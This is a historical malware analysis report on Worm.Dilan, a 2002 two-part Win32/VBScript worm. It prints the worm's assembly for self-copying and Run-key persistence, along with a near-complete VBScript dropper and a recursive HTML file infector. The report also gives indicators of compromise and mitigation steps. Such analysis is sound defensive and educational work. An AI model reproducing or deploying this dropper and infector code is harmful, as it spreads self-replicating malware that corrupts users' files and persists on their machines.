# 🛡️ Malware Analysis Report: Worm.Dilan (aka adlin, linda)

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-Hybrid%20Win32%20worm%20+%20HTML%2FVBScript%20dropper-red)
![Creation Date](https://img.shields.io/badge/created-2002--06--25-orange)

## Overview

Worm.Dilan is a two‑component worm:
- A Win32 PE component (written in assembly) that copies itself to the Windows directory and persists via a Run key, then generates an HTML file in “My Documents” that embeds the worm’s PE as a hex string.
- An HTML+VBScript component (`dilan.htm`) that, when opened in Internet Explorer with ActiveX enabled, decodes the embedded hex to drop `%WINDIR%\scanner.exe`, sets a Run key, and infects local HTML files by prepending a marker and appending the current page’s HTML.

The HTML lure title is “Only For You!” and prompts the user to enable ActiveX if scripting is disabled.

> Historical malware analysis for research and education. Do not execute outside a lawful, isolated lab.

## Execution chain at a glance

1) The Win32 worm runs → copies itself to the Windows directory as `scanner.exe`, sets an HKLM Run value `ScanW32`, and writes `dilan.htm` to the user’s “My Documents”, embedding its own PE as hex.
2) The victim opens `dilan.htm` in IE → VBScript decodes the hex into `%WINDIR%\scanner.exe`, persists again, and recursively infects `.htm/.html` files in common folders. Infected pages contain a first‑line marker `<dilan>`.

---

## Win32 worm (assembly) — `dilan.asm`

### Install and persistence

Copies itself to the Windows directory and persists as `ScanW32`:

```asm
; build copy path under %WINDIR% (intended: scanner.exe)
push    50
mov     esi, offset orgwrm
push    esi
push    0
call    GetModuleFileNameA

mov     edi, offset cpywrm
push    edi
push    50
push    edi
call    GetWindowsDirectoryA
add     edi, eax
; append file name chunks (little-endian dwords)
mov eax, 'acs\'  ; part of "scanner.exe" path chunk
stosd
mov eax, 'renn'
stosd
mov eax, 'exe.'
stosd

push    0
push    edi         ; dest
push    esi         ; src
call    CopyFileA

; HKLM\...\Run\ScanW32 = <copy path>
push    50
push    edi
push    1
push    offset szScanW32      ; "ScanW32"
push    offset szRunKey       ; Software\Microsoft\Windows\CurrentVersion\Run
push    80000002h             ; HKEY_LOCAL_MACHINE
call    SHSetValueA
```

### Embed PE as hex and write `dilan.htm`

Reads its own mapped image, converts each byte to hex, and writes an HTML file into My Documents containing a VBScript stub and the hex payload:

```asm
; map the copied exe and convert to hex into buffer hex_f
push 0
push 0
push 0
push 2
push 0
push ebx              ; file handle
call CreateFileMappingA
xchg eax, ebp
push 0
push 0
push 0
push 4
push ebp
call MapViewOfFile
xchg eax, esi         ; esi -> mapped file

; size in [size], then loop
p_c:  lodsb           ; AL = byte
      call conv_hex   ; returns AX = two ASCII hex chars
      stosw           ; store into hex_f
      dec [size]
      jnz p_c

; compose path: My Documents\dilan.htm and write template s_htm..e_htm
push    0
push    5
push    offset mydoc
push    0
call    SHGetSpecialFolderPathA   ; CSIDL_PERSONAL
push    offset szDilan            ; "\dilan.htm"
push    offset mydoc
call    lstrcat
call    CreateFileA
mov     [hhtm], eax
push    0
push    offset byte
push    e_htm - s_htm
push    offset s_htm
push    [hhtm]
call    WriteFile
```

The HTML template (between labels `s_htm` and `e_htm`) is functionally the same as the provided `dilan.htm`.

---

## HTML/Script dropper and infector — `dilan.htm`

### ActiveX gate and dropper

```html
<script language=vbscript>
On Error Resume Next
Set fso=createobject("scripting.filesystemobject")
Set ws=createobject("wscript.shell")
If err.number=429 then
  document.write "... You need ActiveX enabled ..."
Else
  asmhex = "<hex of PE from dilan.asm>"
  read = dec(asmhex)
  Set r = fso.CreateTextFile(fso.GetSpecialFolder(0)&"\scanner.exe", 2)
  r.Write read: r.Close
  ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanW32", _
               fso.GetSpecialFolder(0)&"\scanner.exe"
  infect fso.GetSpecialFolder(0)
  infect fso.GetSpecialFolder(1)
  infect fso.GetSpecialFolder(2)
  infect ws.SpecialFolders("MyDocuments")
  infect ws.SpecialFolders("Desktop")
  MsgBox "Sorry but your browser can't read this Web file."
End If
```

- Requires IE with ActiveX allowed; otherwise shows an instruction to enable and reload.
- Drops `%WINDIR%\scanner.exe` and sets a Run key `ScanW32`.

### HTML file infector

```vb
Function infect(dir)
If fso.FolderExists(dir) Then
  For each cible in fso.GetFolder(dir).Files
    ext = LCase(fso.GetExtensionName(cible.Name))
    If ext="htm" Or ext="html" Then
      Set gd = fso.OpenTextFile(cible.Path,1)
      If gd.ReadLine <> "<dilan>" Then
        htmorg = gd.ReadAll: gd.Close
        Set gd = fso.OpenTextFile(cible.Path,2)
        gd.WriteLine "<dilan>"
        gd.Write htmorg
        gd.WriteLine document.body.createtextrange.htmltext
        gd.Close
      Else
        gd.Close
      End If
    End If
  Next
End If
End Function
```

- Reinfection guard: `<dilan>` marker must be the first line; otherwise the page is prepended with `<dilan>` and its original contents, then appended with the page’s current `htmltext`, effectively propagating the script block.
- The appended script (the current page body) includes the dropper and this same infector logic, aiding replication.

### Hex decode helper

```vb
Function dec(octe)
On Error Resume Next
For hexad = 1 To Len(octe) Step 2
  dec = dec & Chr("&h" & Mid(octe, hexad, 2))
Next
End Function
```

---

## Indicators of Compromise (IoCs)

- Files and paths:
  - `%WINDIR%\scanner.exe` (dropped by HTML and by the PE self-copy)
  - `%USERPROFILE%\My Documents\dilan.htm` (created by the PE)
- Registry persistence:
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanW32 = <windir>\scanner.exe`
- HTML artifacts:
  - Infected `.htm/.html` files have first line `<dilan>`
  - Pages with title "Only For You!" containing a VBScript block with `asmhex=` and a `dec()` function
  - Appended `document.body.createtextrange.htmltext` near the end

## Mitigation

1. Remove the Run key `ScanW32` and delete `%WINDIR%\scanner.exe`.
2. Delete `%USERPROFILE%\My Documents\dilan.htm`.
3. For infected HTML files, remove the prepended `<dilan>` marker and the appended VBScript block; restore from clean backups where possible.
4. Disable or restrict ActiveX/VBScript in Internet Explorer via Group Policy; prefer modern browsers.
5. Use endpoint protection capable of detecting script-based droppers and PE payload decoding from hex.

## Notes

- The assembly constructs the embedded hex for `dilan.htm` from its own PE image, ensuring consistency between the PE and the HTML dropper.
- The little‑endian chunking used to compose the `scanner.exe` filename in the PE may look odd in disassembly but yields the intended path at runtime.
- The infector targets only HTML files; it does not modify VBS files.

— Analysis based on `dilan.asm` and `dilan.htm`, June 25, 2002.
